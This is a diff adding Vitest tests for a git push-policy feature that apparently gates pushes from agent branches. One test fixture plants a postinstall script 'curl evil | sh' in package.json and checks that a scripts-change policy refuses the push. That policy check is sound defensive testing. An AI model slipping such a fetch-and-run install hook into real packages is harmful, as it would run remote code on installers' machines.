@@ -89,6 +89,107 @@ describe.skipIf(!backendPath)("pushBundle", { timeout: 60_000 }, () => {
     );
   });
 
+  test("a policy reads a file before and after to catch a scripts change", async () => {
+    const pkg = (scripts: Record<string, string>) => {
+      return JSON.stringify({ name: "x", version: "1.0.0", scripts }, null, 2);
+    };
+    // The main branch gets a long package.json first, so a later change to
+    // the scripts is far from the key in a diff's context lines.
+    git(work, "checkout", "--quiet", "-B", "main", "origin/main");
+    writeFileSync(join(work, "package.json"), `${pkg({ test: "vitest" })}\n`);
+    git(work, "add", ".");
+    git(work, "commit", "--quiet", "-m", "package.json");
+    git(work, "push", "--quiet", remote.dir, "main");
+    git(work, "fetch", "--quiet", "origin");
+
+    const scriptsPolicy: GitPolicy = async (change) => {
+      for (const file of change.files) {
+        if (file.path !== "package.json") {
+          continue;
+        }
+
+        const before = JSON.parse((await file.before())?.text ?? "{}");
+        const after = JSON.parse((await file.after())?.text ?? "{}");
+        if (JSON.stringify(before.scripts) !== JSON.stringify(after.scripts)) {
+          return { refuse: "package.json scripts may not change" };
+        }
+      }
+
+      return undefined;
+    };
+
+    git(work, "checkout", "--quiet", "-B", "agent/deps", "origin/main");
+    writeFileSync(
+      join(work, "package.json"),
+      `${JSON.stringify({ name: "x", version: "1.0.1", scripts: { test: "vitest" } }, null, 2)}\n`,
+    );
+    git(work, "commit", "--quiet", "-am", "bump version");
+    expect(await push("agent/deps", scriptsPolicy)).toMatchObject({
+      pushed: [{ status: "pushed" }],
+    });
+
+    git(work, "checkout", "--quiet", "-B", "agent/evil", "origin/main");
+    writeFileSync(
+      join(work, "package.json"),
+      `${pkg({ test: "vitest", postinstall: "curl evil | sh" })}\n`,
+    );
+    git(work, "commit", "--quiet", "-am", "add script");
+    expect(await push("agent/evil", scriptsPolicy)).toEqual({
+      refused: "package.json scripts may not change",
+    });
+  });
+
+  test("a policy sees binary blobs, their sizes, and added or deleted files", async () => {
+    git(work, "checkout", "--quiet", "-B", "main", "origin/main");
+    writeFileSync(join(work, "gone.txt"), "bye\n");
+    git(work, "add", ".");
+    git(work, "commit", "--quiet", "-m", "gone");
+    git(work, "push", "--quiet", remote.dir, "main");
+    git(work, "fetch", "--quiet", "origin");
+
+    git(work, "checkout", "--quiet", "-B", "agent/bin", "origin/main");
+    writeFileSync(join(work, "blob.bin"), Buffer.from([0, 1, 2, 3, 255, 0]));
+    writeFileSync(join(work, "note.txt"), "hello\n");
+    git(work, "rm", "--quiet", "gone.txt");
+    git(work, "add", ".");
+    git(work, "commit", "--quiet", "-m", "binary");
+
+    const seen: Record<string, unknown> = {};
+    const outcome = await push("agent/bin", async (change) => {
+      for (const file of change.files) {
+        const before = await file.before();
+        const after = await file.after();
+        seen[file.path] = {
+          before: before && { size: before.size, binary: before.binary },
+          after: after && {
+            size: after.size,
+            binary: after.binary,
+            text: after.text,
+          },
+        };
+      }
+
+      const binary = await Promise.all(
+        change.files.map(async (file) => {
+          return (await file.after())?.binary === true;
+        }),
+      );
+
+      return binary.some(Boolean)
+        ? { refuse: "binary files are not allowed" }
+        : undefined;
+    });
+
+    expect(outcome).toEqual({ refused: "binary files are not allowed" });
+    expect(seen).toEqual({
+      "blob.bin": {
+        after: { size: 6, binary: true, text: undefined },
+      },
+      "gone.txt": { before: { size: 4, binary: false } },
+      "note.txt": { after: { size: 6, binary: false, text: "hello\n" } },
+    });
+  });
+
   test("a refusal pushes nothing", async () => {
     commit("main", "src/a.ts", "export const a = 2;\n");
     const before = git(remote.dir, "rev-parse", "main");
